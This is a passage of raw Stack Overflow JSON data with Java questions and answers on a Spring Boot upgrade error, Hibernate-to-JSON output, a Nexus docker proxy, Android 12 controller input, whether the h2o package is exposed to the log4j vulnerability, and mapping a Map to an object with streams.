here][1]][1]\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/4s9wZ.png\r\n\r\n\r\nhow can I update my springboot version without having trouble with this dependency?","title":"upgrading spring boot to 2.4.1","body":"<p>I need to upgrade my spring boot to 2.4.1 from 2.3.7.RELEASE.\nwhen I update my pom file, I get error in spring-security-oauth2 dependency (version 2.4.1.RELEASE).\nbefore I've upgraded my spring version, spring-security-oauth2 2.4.1.RELEASE, worked fine with springboot 2.3.7.RELEASE</p>\n<p>my pom file dependency:</p>\n<pre><code>&lt;parent&gt;\n    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n    &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;\n    &lt;version&gt;2.4.1&lt;/version&gt;\n    &lt;relativePath /&gt;\n&lt;/parent&gt;\n    &lt;dependency&gt;\n        &lt;groupId&gt;org.springframework.security.oauth&lt;/groupId&gt;\n        &lt;artifactId&gt;spring-security-oauth2&lt;/artifactId&gt;\n        &lt;version&gt;2.4.1.RELEASE&lt;/version&gt;\n        &lt;exclusions&gt;\n            &lt;exclusion&gt;\n                &lt;artifactId&gt;spring-security-core&lt;/artifactId&gt;\n                &lt;groupId&gt;org.springframework.security&lt;/groupId&gt;\n            &lt;/exclusion&gt;\n            &lt;exclusion&gt;\n                &lt;artifactId&gt;spring-web&lt;/artifactId&gt;\n                &lt;groupId&gt;org.springframework&lt;/groupId&gt;\n            &lt;/exclusion&gt;\n        &lt;/exclusions&gt;\n    &lt;/dependency&gt;\n</code></pre>\n<p>this is my exception when I try to run my app-</p>\n<pre><code>org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'configurationPropertiesBeans' defined in class path resource [org/springframework/cloud/autoconfigure/ConfigurationPropertiesRebinderAutoConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.springframework.cloud.context.properties.ConfigurationPropertiesBeans]: Factory method 'configurationPropertiesBeans' threw exception; nested exception is java.lang.NoClassDefFoundError: org/springframework/boot/context/properties/ConfigurationBeanFactoryMetadata\nat org.springframework.beans.factory.support.ConstructorResolver.instantiate(ConstructorResolver.java:658) ~[spring-beans-5.3.2.jar:5.3.2]\nat org.springframework.beans.factory.support.ConstructorResolver.instantiateUsingFactoryMethod(ConstructorResolver.java:486) ~[spring-beans-5.3.2.jar:5.3.2]\nat org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateUsingFactoryMethod(AbstractAutowireCapableBeanFactory.java:1336) ~[spring-beans-5.3.2.jar:5.3.2]\nat org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1179) ~[spring-beans-5.3.2.jar:5.3.2]\nat org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:571) ~[spring-beans-5.3.2.jar:5.3.2]\nat org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:531) ~[spring-beans-5.3.2.jar:5.3.2]\nat org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335) ~[spring-beans-5.3.2.jar:5.3.2]\nat org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) ~[spring-beans-5.3.2.jar:5.3.2]\nat org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333) ~[spring-beans-5.3.2.jar:5.3.2]\nat org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:213) ~[spring-beans-5.3.2.jar:5.3.2]\nat org.springframework.context.support.PostProcessorRegistrationDelegate.registerBeanPostProcessors(PostProcessorRegistrationDelegate.java:244) ~[spring-context-5.3.2.jar:5.3.2]\nat org.springframework.context.support.AbstractApplicationContext.registerBeanPostProcessors(AbstractApplicationContext.java:767) ~[spring-context-5.3.2.jar:5.3.2]\nat org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:572) ~[spring-context-5.3.2.jar:5.3.2]\nat org.springframework.boot.SpringApplication.refresh(SpringApplication.java:767) ~[spring-boot-2.4.1.jar:2.4.1]\nat org.springframework.boot.SpringApplication.refresh(SpringApplication.java:759) ~[spring-boot-2.4.1.jar:2.4.1]\nat org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:426) ~[spring-boot-2.4.1.jar:2.4.1]\nat org.springframework.boot.SpringApplication.run(SpringApplication.java:326) ~[spring-boot-2.4.1.jar:2.4.1]\nat org.springframework.boot.builder.SpringApplicationBuilder.run(SpringApplicationBuilder.java:144) ~[spring-boot-2.4.1.jar:2.4.1]\nat org.springframework.cloud.bootstrap.BootstrapApplicationListener.bootstrapServiceContext(BootstrapApplicationListener.java:203) ~[spring-cloud-context-2.1.2.RELEASE.jar:2.1.2.RELEASE]\nat org.springframework.cloud.bootstrap.BootstrapApplicationListener.onApplicationEvent(BootstrapApplicationListener.java:114) ~[spring-cloud-context-2.1.2.RELEASE.jar:2.1.2.RELEASE]\nat org.springframework.cloud.bootstrap.BootstrapApplicationListener.onApplicationEvent(BootstrapApplicationListener.java:71) ~[spring-cloud-context-2.1.2.RELEASE.jar:2.1.2.RELEASE]\nat org.springframework.context.event.SimpleApplicationEventMulticaster.doInvokeListener(SimpleApplicationEventMulticaster.java:172) ~[spring-context-5.3.2.jar:5.3.2]\nat org.springframework.context.event.SimpleApplicationEventMulticaster.invokeListener(SimpleApplicationEventMulticaster.java:165) ~[spring-context-5.3.2.jar:5.3.2]\nat org.springframework.context.event.SimpleApplicationEventMulticaster.multicastEvent(SimpleApplicationEventMulticaster.java:139) ~[spring-context-5.3.2.jar:5.3.2]\nat org.springframework.context.event.SimpleApplicationEventMulticaster.multicastEvent(SimpleApplicationEventMulticaster.java:127) ~[spring-context-5.3.2.jar:5.3.2]\nat org.springframework.boot.context.event.EventPublishingRunListener.environmentPrepared(EventPublishingRunListener.java:82) ~[spring-boot-2.4.1.jar:2.4.1]\nat \n</code></pre>\n<p><a href=\"https://i.stack.imgur.com/4s9wZ.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/4s9wZ.png\" alt=\"enter image description here\" /></a></p>\n<p>how can I update my springboot version without having trouble with this dependency?</p>\n"},{"tags":["java","json","hibernate","hibernate-criteria"],"answers":[{"tags":[],"owner":{"account_id":5051416,"reputation":433,"user_id":4055885,"display_name":"OnurBulbul"},"down_vote_count":0,"up_vote_count":0,"is_accepted":true,"score":0,"last_activity_date":1505908295,"creation_date":1505908295,"answer_id":46321307,"question_id":46321202,"body_markdown":"Create a class namely :\r\n\r\n    public class JsonSendData {\r\n        public int number_of_record;\r\n        public string sesion_id;\r\n        public List&lt;UserClass&gt; car;\r\n    }\r\nTake an instance and set the properties. You can serialize your object as expected.","title":"Send the List in JSON Object to the client In Java | Hibernate","body":"<p>Create a class namely :</p>\n\n<pre><code>public class JsonSendData {\n    public int number_of_record;\n    public string sesion_id;\n    public List&lt;UserClass&gt; car;\n}\n</code></pre>\n\n<p>Take an instance and set the properties. You can serialize your object as expected.</p>\n"}],"owner":{"account_id":4570877,"reputation":583,"user_id":3710610,"accept_rate":33,"display_name":"ansh"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":218,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":46321307,"answer_count":1,"score":0,"last_activity_date":1639583836,"creation_date":1505908007,"question_id":46321202,"body_markdown":"I am fetching data from database using `Hibernate`, and I am getting the data in the List `result_list`&lt;br/&gt;\r\nI want to send this in the from of JSON to the client.&lt;br/&gt;\r\n**My Code:**\r\n\r\n    SessionFactory sessionFactory;\r\n    Session session = null;\r\n    JSONObject jsonObject = new JSONObject();\r\n\r\n    sessionFactory = HibernateUtility.getSessionFactory();\r\n    session = sessionFactory.openSession();\r\n    session.beginTransaction(); \r\n\r\n    Criteria criteria = session.createCriteria(UserClass.class);\r\n    \r\n    List&lt;UserClass&gt; result_list = (List&lt;UserClass&gt;) criteria.list();\r\n\r\nI want to send result_list in JSON Object with some other info like `number rows` and  `sessionID` \r\n\r\nSample Output:&lt;br/&gt;\r\n\r\n```json\r\n{ \r\n    &quot;number_of_record&quot;:2,\r\n    &quot;sesion_id&quot;:&quot;sessision343seudur5ivce&quot;,\r\n    &quot;car&quot;: result_list  \r\n}\r\n```\r\n","title":"Send the List in JSON Object to the client In Java | Hibernate","body":"<p>I am fetching data from database using <code>Hibernate</code>, and I am getting the data in the List <code>result_list</code><br/>\nI want to send this in the from of JSON to the client.<br/>\n<strong>My Code:</strong></p>\n<pre><code>SessionFactory sessionFactory;\nSession session = null;\nJSONObject jsonObject = new JSONObject();\n\nsessionFactory = HibernateUtility.getSessionFactory();\nsession = sessionFactory.openSession();\nsession.beginTransaction(); \n\nCriteria criteria = session.createCriteria(UserClass.class);\n\nList&lt;UserClass&gt; result_list = (List&lt;UserClass&gt;) criteria.list();\n</code></pre>\n<p>I want to send result_list in JSON Object with some other info like <code>number rows</code> and  <code>sessionID</code></p>\n<p>Sample Output:<br/></p>\n<pre class=\"lang-json prettyprint-override\"><code>{ \n    &quot;number_of_record&quot;:2,\n    &quot;sesion_id&quot;:&quot;sessision343seudur5ivce&quot;,\n    &quot;car&quot;: result_list  \n}\n</code></pre>\n"},{"tags":["java","docker","nginx","proxy","nexus"],"comments":[{"owner":{"account_id":2488420,"reputation":5122,"user_id":2166420,"display_name":"rseddon"},"score":1,"creation_date":1609943224,"post_id":65586591,"comment_id":115978280,"body_markdown":"Docker registries must run on web context path &quot;/&quot;, so trying to pull from &quot;/repository/company-docker-group&quot; isn&#39;t going to work.  See our docs for information on how to get the repository to appear on context path &quot;/&quot;:  https://help.sonatype.com/display/NXRM3/SSL+and+Repository+Connector+Configuration","body":"Docker registries must run on web context path &quot;/&quot;, so trying to pull from &quot;/repository/company-docker-group&quot; isn&#39;t going to work.  See our docs for information on how to get the repository to appear on context path &quot;/&quot;:  <a href=\"https://help.sonatype.com/display/NXRM3/SSL+and+Repository+Connector+Configuration\" rel=\"nofollow noreferrer\">help.sonatype.com/display/NXRM3/&hellip;</a>"}],"answers":[{"tags":[],"owner":{"account_id":2759831,"reputation":902,"user_id":2376937,"display_name":"Cristian Gon&#231;alves"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1639583702,"creation_date":1639583398,"answer_id":70366576,"question_id":65586591,"body_markdown":"[Sonatype documentation][1] - on the subject - tells us that:\r\n\r\n&gt; **Docker relies on secure connections using SSL** to connect to the repositories. **You are** therefore **required to expose the repository** manager **to your client** tools **via HTTPS**\r\n\r\n&gt; **Interaction** of the **docker client with repositories requires specific ports** to be used. These can be configured in the repository configuration in the Repository Connectors section\r\n\r\n&gt; In order for this to work on your network, **you need to ensure** that the **chosen ports are available in your organization** and not used by some other application, and that no firewall or other network configuration prevents connectivity\r\n\r\nTherefore, regarding your case, you must log in to your custom docker registry through the command `docker login https://repository.company.com:8092`\r\n\r\nAfter successful login, imagine you want to save a custom image of `nginx`, named `mynginx`, into a `com/company/proxy` folder, within the company&#39;s private docker registry. In order to be able to push/pull images to/from your custom docker repository, you must:\r\n\r\n 1. Tag your image as `repository.company.com:8092/com/company/proxy/mynginx:1.0.0` through the command `docker tag mynginx:1.0.0 repository.company.com:8092/com/company/proxy/mynginx:1.0.0`.\r\n 2. Apply the following command in order to push your custom image to the company&#39;s private docker registry: `docker push repository.company.com:8092/com/company/proxy/mynginx:1.0.0`\r\n\r\nBy saving your custom image you can always pull it using: `docker pull repository.company.com:8092/com/company/proxy/mynginx:1.0.0`\r\n\r\n  [1]: https://help.sonatype.com/repomanager3/nexus-repository-administration/formats/docker-registry/ssl-and-repository-connector-configuration","title":"Using Sonatype Nexus docker proxy","body":"<p><a href=\"https://help.sonatype.com/repomanager3/nexus-repository-administration/formats/docker-registry/ssl-and-repository-connector-configuration\" rel=\"nofollow noreferrer\">Sonatype documentation</a> - on the subject - tells us that:</p>\n<blockquote>\n<p><strong>Docker relies on secure connections using SSL</strong> to connect to the repositories. <strong>You are</strong> therefore <strong>required to expose the repository</strong> manager <strong>to your client</strong> tools <strong>via HTTPS</strong></p>\n</blockquote>\n<blockquote>\n<p><strong>Interaction</strong> of the <strong>docker client with repositories requires specific ports</strong> to be used. These can be configured in the repository configuration in the Repository Connectors section</p>\n</blockquote>\n<blockquote>\n<p>In order for this to work on your network, <strong>you need to ensure</strong> that the <strong>chosen ports are available in your organization</strong> and not used by some other application, and that no firewall or other network configuration prevents connectivity</p>\n</blockquote>\n<p>Therefore, regarding your case, you must log in to your custom docker registry through the command <code>docker login https://repository.company.com:8092</code></p>\n<p>After successful login, imagine you want to save a custom image of <code>nginx</code>, named <code>mynginx</code>, into a <code>com/company/proxy</code> folder, within the company's private docker registry. In order to be able to push/pull images to/from your custom docker repository, you must:</p>\n<ol>\n<li>Tag your image as <code>repository.company.com:8092/com/company/proxy/mynginx:1.0.0</code> through the command <code>docker tag mynginx:1.0.0 repository.company.com:8092/com/company/proxy/mynginx:1.0.0</code>.</li>\n<li>Apply the following command in order to push your custom image to the company's private docker registry: <code>docker push repository.company.com:8092/com/company/proxy/mynginx:1.0.0</code></li>\n</ol>\n<p>By saving your custom image you can always pull it using: <code>docker pull repository.company.com:8092/com/company/proxy/mynginx:1.0.0</code></p>\n"}],"owner":{"account_id":7308963,"reputation":314,"user_id":5568903,"accept_rate":29,"display_name":"Matt"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":1660,"favorite_count":0,"down_vote_count":0,"up_vote_count":2,"answer_count":1,"score":2,"last_activity_date":1639583702,"creation_date":1609880899,"question_id":65586591,"body_markdown":"I have a Sonatype Nexus deployed under repository.company.com (it&#39;s behind an nginx proxy).\r\n\r\nI created a docker registry and docker proxy and added them to one docker group &quot;company-docker-group&quot;. The proxy is set to mirror https://registry-1.docker.io and also has the foreign layer caching option checked.\r\n\r\nI have a http connector set for port 8092 but at this moment I do not have access to change the nginx configuration so that I can access that port directly. I noticed that there is an URL in the docker group defined as `https://repository.company.com/repository/company-docker-group/`\r\n\r\nAm I able to access the group via this url? I am able to `docker login` into this url but then when I try \r\n`docker pull repository.company.com/repository/company-docker-group/maven:3.6.2-jdk-8`\r\nthen I get this error:\r\n```\r\nError response from daemon: manifest for repository.company.com/repository/company-docker-group/maven:3.6.2-jdk-8 not found: manifest unknown: manifest unknown\r\n```\r\n\r\nCan I only access the image via `repository.company.com:8092/maven:3.6.2-jdk-8` or is there a way to use the docker group URL?","title":"Using Sonatype Nexus docker proxy","body":"<p>I have a Sonatype Nexus deployed under repository.company.com (it's behind an nginx proxy).</p>\n<p>I created a docker registry and docker proxy and added them to one docker group &quot;company-docker-group&quot;. The proxy is set to mirror <a href=\"https://registry-1.docker.io\" rel=\"nofollow noreferrer\">https://registry-1.docker.io</a> and also has the foreign layer caching option checked.</p>\n<p>I have a http connector set for port 8092 but at this moment I do not have access to change the nginx configuration so that I can access that port directly. I noticed that there is an URL in the docker group defined as <code>https://repository.company.com/repository/company-docker-group/</code></p>\n<p>Am I able to access the group via this url? I am able to <code>docker login</code> into this url but then when I try\n<code>docker pull repository.company.com/repository/company-docker-group/maven:3.6.2-jdk-8</code>\nthen I get this error:</p>\n<pre><code>Error response from daemon: manifest for repository.company.com/repository/company-docker-group/maven:3.6.2-jdk-8 not found: manifest unknown: manifest unknown\n</code></pre>\n<p>Can I only access the image via <code>repository.company.com:8092/maven:3.6.2-jdk-8</code> or is there a way to use the docker group URL?</p>\n"},{"tags":["java","android","android-12","gamepad-api"],"answers":[{"tags":[],"owner":{"account_id":8324552,"reputation":2154,"user_id":6255000,"display_name":"DenverCoder9"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1639583547,"creation_date":1639583547,"answer_id":70366614,"question_id":70349934,"body_markdown":"This is probably doable with [WebHI](https://web.dev/hid/). I am aware of a [project](https://github.com/TheBITLINK/WebHID-DS4) that provides a WebHID-based driver, so you can get access to the sensors in the controller. ","title":"Android 12 DualSense/ DualShock support via Bluetooth","body":"<p>This is probably doable with <a href=\"https://web.dev/hid/\" rel=\"nofollow noreferrer\">WebHI</a>. I am aware of a <a href=\"https://github.com/TheBITLINK/WebHID-DS4\" rel=\"nofollow noreferrer\">project</a> that provides a WebHID-based driver, so you can get access to the sensors in the controller.</p>\n"}],"owner":{"account_id":2658237,"reputation":584,"user_id":2298490,"display_name":"grill2010"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":509,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":1,"score":0,"last_activity_date":1639583547,"creation_date":1639489619,"question_id":70349934,"body_markdown":"Android 12 added some new nice features to the controller API like rumble support. In Android 12 it&#39;s also possible to process the gyroscope and touchpad inputs from a DualSense/ DualShock controller via Bluetooth. How can an app process touchpad and gyroscope data from a DualSense/ DualShock controller? The official Remote Play app from Sony is able to do that but in my app for example the controller touchpad always acts as a mouse input (and even shows a mouse pointer inside the activity) and I don&#39;t know how to disable that. Does anyone already have experience with this or are there examples available anywhere which I didn&#39;t found?","title":"Android 12 DualSense/ DualShock support via Bluetooth","body":"<p>Android 12 added some new nice features to the controller API like rumble support. In Android 12 it's also possible to process the gyroscope and touchpad inputs from a DualSense/ DualShock controller via Bluetooth. How can an app process touchpad and gyroscope data from a DualSense/ DualShock controller? The official Remote Play app from Sony is able to do that but in my app for example the controller touchpad always acts as a mouse input (and even shows a mouse pointer inside the activity) and I don't know how to disable that. Does anyone already have experience with this or are there examples available anywhere which I didn't found?</p>\n"},{"tags":["java","r","security","log4j","h2o"],"comments":[{"owner":{"account_id":6587388,"reputation":437,"user_id":5089773,"display_name":"Michal"},"score":1,"creation_date":1640296118,"post_id":70366277,"comment_id":124565917,"body_markdown":"In reaction to CVE-2021-45105 H2O.ai products were upgraded to use log4j version 2.17.0. More details are in the security bulletin https://www.h2o.ai/security/bulletins/h2o-2021-001/","body":"In reaction to CVE-2021-45105 H2O.ai products were upgraded to use log4j version 2.17.0. More details are in the security bulletin <a href=\"https://www.h2o.ai/security/bulletins/h2o-2021-001/\" rel=\"nofollow noreferrer\">h2o.ai/security/bulletins/h2o-2021-001</a>"}],"answers":[{"tags":[],"owner":{"account_id":22488238,"reputation":165,"user_id":16686308,"display_name":"Luna"},"down_vote_count":0,"up_vote_count":3,"is_accepted":false,"score":3,"last_activity_date":1639583218,"creation_date":1639583218,"answer_id":70366535,"question_id":70366277,"body_markdown":"A jar file is just a compressed folder with a different name. You can explore your packages looking for this information.\r\n\r\nH2Os official statement, including affected versions and recommendations: https://www.h2o.ai/security/bulletins/h2o-2021-001/","title":"Is R-Package h2o affected by log4j-vulnerability? (and how to solve)","body":"<p>A jar file is just a compressed folder with a different name. You can explore your packages looking for this information.</p>\n<p>H2Os official statement, including affected versions and recommendations: <a href=\"https://www.h2o.ai/security/bulletins/h2o-2021-001/\" rel=\"nofollow noreferrer\">https://www.h2o.ai/security/bulletins/h2o-2021-001/</a></p>\n"},{"tags":[],"owner":{"account_id":6667055,"reputation":723,"user_id":7373144,"accept_rate":67,"display_name":"bradley101"},"down_vote_count":0,"up_vote_count":3,"is_accepted":false,"score":3,"last_activity_date":1639583233,"creation_date":1639583233,"answer_id":70366543,"question_id":70366277,"body_markdown":"As stated on https://logging.apache.org/log4j/2.x/security.html Log4J 1.x versions are not affected by this vulnerability. And it seems that `h2o` is using `log4j-1.2.15.jar` so you are okay.","title":"Is R-Package h2o affected by log4j-vulnerability? (and how to solve)","body":"<p>As stated on <a href=\"https://logging.apache.org/log4j/2.x/security.html\" rel=\"nofollow noreferrer\">https://logging.apache.org/log4j/2.x/security.html</a> Log4J 1.x versions are not affected by this vulnerability. And it seems that <code>h2o</code> is using <code>log4j-1.2.15.jar</code> so you are okay.</p>\n"}],"owner":{"account_id":19563833,"reputation":1770,"user_id":14316488,"display_name":"Jonas"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":751,"favorite_count":0,"down_vote_count":2,"up_vote_count":6,"answer_count":2,"score":4,"last_activity_date":1639583233,"creation_date":1639582169,"question_id":70366277,"body_markdown":"A vulnerability of `log4j` became public.\r\nAmongst other packages, I am using R `shiny` and `h2o` packages. \r\nI already found out, that `shiny` is not affected by the vulnerability, since it uses `log4js`(see https://github.com/log4js-node/log4js-node/issues/1105), which is an implementation in Javascript.\r\n\r\nNow we come to `h2o`. I know that this package provides an API to the `h2o`-framework in Java. In the documentation of building `h2o` from source from github (see https://h2o-release.s3.amazonaws.com/h2o/rel-noether/4/docs-website/developuser/quickstart_git.html), i found along the lines\r\n```\r\njavac -source 1.6 -target 1.6 -sourcepath src/main/java -classpath\r\n&quot;../lib/log4j/log4j-1.2.15.jar:../target/h2o.jar:../lib/hadoop/mapr2.1.3/hadoop-0.20.2-dev-core.jar&quot;\r\n-d classes/mapr2.1.3 src/main/java/water/hadoop/*.java\r\nwarning: [options] bootstrap class path not set in conjunction with -source 1.6\r\n1 warning\r\njar cf target/h2odriver_mapr2.1.3.jar -C classes/mapr2.1.3 .\r\nmake build_inner HADOOP_VERSION=cdh3\r\nmkdir classes/cdh3\r\njavac -source 1.6 -target 1.6 -sourcepath src/main/java -classpath\r\n&quot;../lib/log4j/log4j-1.2.15.jar:../target/h2o.jar:../lib/hadoop/cdh3/hadoop-core-0.20.2-cdh3u6.jar&quot; -d\r\nclasses/cdh3 src/main/java/water/hadoop/*.java\r\nwarning: [options] bootstrap class path not set in conjunction with -source 1.6\r\n1 warning\r\njar cf target/h2odriver_cdh3.jar -C classes/cdh3 .\r\nmake build_inner HADOOP_VERSION=cdh4\r\nmkdir classes/cdh4\r\njavac -source 1.6 -target 1.6 -sourcepath src/main/java -classpath\r\n&quot;../lib/log4j/log4j-1.2.15.jar:../target/h2o.jar:../lib/hadoop/cdh4/hadoop-common.jar:../\r\n```\r\nIt seems like `h2o` is using `log4j`, but I don&#39;t know much about Java and its dependencies. \r\n\r\nCan anyone with more knowledge clearify whether the `h2o`-package is affected by the `log4j` vulnerability? And if so, how to solve or workaround this?\r\n\r\nThank you very much in advance.\r\n","title":"Is R-Package h2o affected by log4j-vulnerability? (and how to solve)","body":"<p>A vulnerability of <code>log4j</code> became public.\nAmongst other packages, I am using R <code>shiny</code> and <code>h2o</code> packages.\nI already found out, that <code>shiny</code> is not affected by the vulnerability, since it uses <code>log4js</code>(see <a href=\"https://github.com/log4js-node/log4js-node/issues/1105\" rel=\"nofollow noreferrer\">https://github.com/log4js-node/log4js-node/issues/1105</a>), which is an implementation in Javascript.</p>\n<p>Now we come to <code>h2o</code>. I know that this package provides an API to the <code>h2o</code>-framework in Java. In the documentation of building <code>h2o</code> from source from github (see <a href=\"https://h2o-release.s3.amazonaws.com/h2o/rel-noether/4/docs-website/developuser/quickstart_git.html\" rel=\"nofollow noreferrer\">https://h2o-release.s3.amazonaws.com/h2o/rel-noether/4/docs-website/developuser/quickstart_git.html</a>), i found along the lines</p>\n<pre><code>javac -source 1.6 -target 1.6 -sourcepath src/main/java -classpath\n&quot;../lib/log4j/log4j-1.2.15.jar:../target/h2o.jar:../lib/hadoop/mapr2.1.3/hadoop-0.20.2-dev-core.jar&quot;\n-d classes/mapr2.1.3 src/main/java/water/hadoop/*.java\nwarning: [options] bootstrap class path not set in conjunction with -source 1.6\n1 warning\njar cf target/h2odriver_mapr2.1.3.jar -C classes/mapr2.1.3 .\nmake build_inner HADOOP_VERSION=cdh3\nmkdir classes/cdh3\njavac -source 1.6 -target 1.6 -sourcepath src/main/java -classpath\n&quot;../lib/log4j/log4j-1.2.15.jar:../target/h2o.jar:../lib/hadoop/cdh3/hadoop-core-0.20.2-cdh3u6.jar&quot; -d\nclasses/cdh3 src/main/java/water/hadoop/*.java\nwarning: [options] bootstrap class path not set in conjunction with -source 1.6\n1 warning\njar cf target/h2odriver_cdh3.jar -C classes/cdh3 .\nmake build_inner HADOOP_VERSION=cdh4\nmkdir classes/cdh4\njavac -source 1.6 -target 1.6 -sourcepath src/main/java -classpath\n&quot;../lib/log4j/log4j-1.2.15.jar:../target/h2o.jar:../lib/hadoop/cdh4/hadoop-common.jar:../\n</code></pre>\n<p>It seems like <code>h2o</code> is using <code>log4j</code>, but I don't know much about Java and its dependencies.</p>\n<p>Can anyone with more knowledge clearify whether the <code>h2o</code>-package is affected by the <code>log4j</code> vulnerability? And if so, how to solve or workaround this?</p>\n<p>Thank you very much in advance.</p>\n"},{"tags":["java","java-stream"],"comments":[{"owner":{"account_id":11092824,"reputation":484,"user_id":8144061,"accept_rate":100,"display_name":"Wing Kui Tsoi"},"score":1,"creation_date":1639498809,"post_id":70351997,"comment_id":124361401,"body_markdown":"If this map is for 1 user, why do you need stream to create a simple user?","body":"If this map is for 1 user, why do you need stream to create a simple user?"},{"owner":{"account_id":1601250,"reputation":1253,"user_id":1482231,"accept_rate":52,"display_name":"Prasath"},"score":1,"creation_date":1639499743,"post_id":70351997,"comment_id":124361807,"body_markdown":"does your map has only 2 entries (&quot;username&quot;, &quot;password&quot;)?","body":"does your map has only 2 entries (&quot;username&quot;, &quot;password&quot;)?"},{"owner":{"account_id":5268074,"reputation":17816,"user_id":4207306,"display_name":"Eklavya"},"score":1,"creation_date":1639507972,"post_id":70351997,"comment_id":124364951,"body_markdown":"Seems like `return adapter.getSecret(&quot;abc&quot;).map(user -&gt; new SimpleUser(user.get(&quot;username&quot;).toString(), user.get(&quot;password&quot;).toString())).orElseThrow();`","body":"Seems like <code>return adapter.getSecret(&quot;abc&quot;).map(user -&gt; new SimpleUser(user.get(&quot;username&quot;).toString(), user.get(&quot;password&quot;).toString())).orElseThrow();</code>"},{"owner":{"account_id":531328,"reputation":1086,"user_id":2122950,"accept_rate":100,"display_name":"Homewrecker"},"score":0,"creation_date":1639573361,"post_id":70351997,"comment_id":124382357,"body_markdown":"@WingKuiTsoi if there is another way to do it without streams that&#39;s also good, but I just want it to be clean and readble. Prasath yes it has","body":"@WingKuiTsoi if there is another way to do it without streams that&#39;s also good, but I just want it to be clean and readble. Prasath yes it has"},{"owner":{"account_id":3211603,"reputation":289297,"user_id":2711488,"display_name":"Holger"},"score":1,"creation_date":1639577849,"post_id":70351997,"comment_id":124384457,"body_markdown":"“*but I just want it to be clean and readble*”—then don’t add an entirely obsolete Stream operation. Use something like Eklavya has shown.","body":"“<i>but I just want it to be clean and readble</i>”—then don’t add an entirely obsolete Stream operation. Use something like Eklavya has shown."}],"answers":[{"tags":[],"owner":{"account_id":11092824,"reputation":484,"user_id":8144061,"accept_rate":100,"display_name":"Wing Kui Tsoi"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1639582852,"creation_date":1639582852,"answer_id":70366446,"question_id":70351997,"body_markdown":"This is one not good pratice but tricky way to put them all in one line. Use jackson objectMapper **only if** the SimpleUser (Object) field names are the same as the Map, i.e. username and password.\r\n \r\n    SimpleUser u = new ObjectMapper().convertValue(\r\n    adapter.getSecret(&quot;abc&quot;)orElseThrow().entrySet().stream()\r\n    .collect(Collectors.toMap(Entry::getKey, v -&gt; v.getValue().toString()))\r\n\t, SimpleUser.class);\r\n\r\nAnd you will need this library.\r\n\r\n\r\n    &lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-databind --&gt;\r\n    &lt;dependency&gt;\r\n    &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;\r\n    &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;\r\n    &lt;version&gt;2.13.0&lt;/version&gt;\r\n    &lt;/dependency&gt;\r\n\r\nFor your reference.","title":"Transform Map&lt;String, Object&gt; to Object using Java streams","body":"<p>This is one not good pratice but tricky way to put them all in one line. Use jackson objectMapper <strong>only if</strong> the SimpleUser (Object) field names are the same as the Map, i.e. username and password.</p>\n<pre><code>SimpleUser u = new ObjectMapper().convertValue(\nadapter.getSecret(&quot;abc&quot;)orElseThrow().entrySet().stream()\n.collect(Collectors.toMap(Entry::getKey, v -&gt; v.getValue().toString()))\n, SimpleUser.class);\n</code></pre>\n<p>And you will need this library.</p>\n<pre><code>&lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-databind --&gt;\n&lt;dependency&gt;\n&lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;\n&lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;\n&lt;version&gt;2.13.0&lt;/version&gt;\n&lt;/dependency&gt;\n</code></pre>\n<p>For your reference.</p>\n"}],"owner":{"account_id":531328,"reputation":1086,"user_id":2122950,"accept_rate":100,"display_name":"Homewrecker"},"comment_count":5,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":329,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":1,"score":0,"last_activity_date":1639582852,"creation_date":1639498148,"question_id":70351997,"body_markdown":"I have a Map&lt;String, Object&gt; and I want to transform it to an Object.\r\nBasically the Map will contain the following:\r\n\r\n```\r\nusername xyz\r\npassword abc\r\n```\r\n\r\nI want to transform it to a SimpleUser object which has two fields: username and password.\r\nThe current code looks like this, but I was wondering if I could do the object initialization inside the Stream:\r\n\r\n```java\r\nMap&lt;String, String&gt; user = adapter\r\n    .getSecret(&quot;abc&quot;)\r\n    .orElseThrow()\r\n    .entrySet().stream()\r\n    .collect(Collectors.toMap(Entry::getKey, v -&gt; v.getValue().toString()));\r\n\r\nreturn new SimpleUser(user.get(&quot;username&quot;), 